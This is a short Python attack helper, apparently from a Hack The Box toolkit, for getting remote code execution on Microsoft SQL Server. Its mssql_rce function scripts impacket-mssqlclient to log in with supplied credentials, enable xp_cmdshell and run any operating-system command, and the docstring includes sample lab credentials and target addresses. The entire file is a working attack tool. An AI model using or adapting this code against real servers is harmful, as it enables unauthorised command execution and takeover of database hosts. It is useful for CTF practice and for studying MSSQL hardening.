import pwn
import implants

"""
With valid credentials and correct permissions, execute commands on remote MSSQL server

Example usage (Tested on HTB Querier):
    username = "mssql-svc"
    password = "corporate568"
    target = "10.10.10.125"
    command = "ping 10.10.14.10"
    print(mssql_rce(username, password, target, command))
"""
def mssql_rce(username, password, target, command):
    p = pwn.process(["/usr/bin/impacket-mssqlclient", "-windows-auth", f"{username}:{password}@{target}"], stdin=pwn.PTY)
    p.readuntil(")>")
    p.send(b"enable_xp_cmdshell\n")
    p.send(b'\4')
    p.readuntil("install.")
    p.readuntil("install.")
    p.send(f"xp_cmdshell {command}\n")
    p.send(b'\4')
    p.readuntil("NULL")
    output = p.readuntil("NULL")
    decoded_output = output.decode('utf-8')
    cleaned_output = decoded_output.replace('NULL', '').strip()
    return cleaned_output

if __name__=="__main__":
    pass
